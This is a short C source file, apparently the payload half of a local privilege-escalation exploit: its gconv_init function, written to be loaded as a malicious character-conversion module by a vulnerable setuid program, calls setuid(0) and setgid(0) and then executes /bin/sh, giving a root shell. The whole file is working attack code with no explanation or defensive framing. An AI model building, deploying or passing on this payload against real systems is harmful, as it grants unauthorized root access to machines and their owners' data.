#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}

void gconv_init() {

    char * const ARGUMENTS[] = {
        "/bin/sh",
        NULL
    };

    char * const ENVIRONMENT[] = {
        "PATH=/bin:/sbin:/usr/bin:/usr/sbin/",
        NULL
    };

    setuid(0);
    setgid(0);
    execve(ARGUMENTS[0], ARGUMENTS, ENVIRONMENT);
    exit(0);

}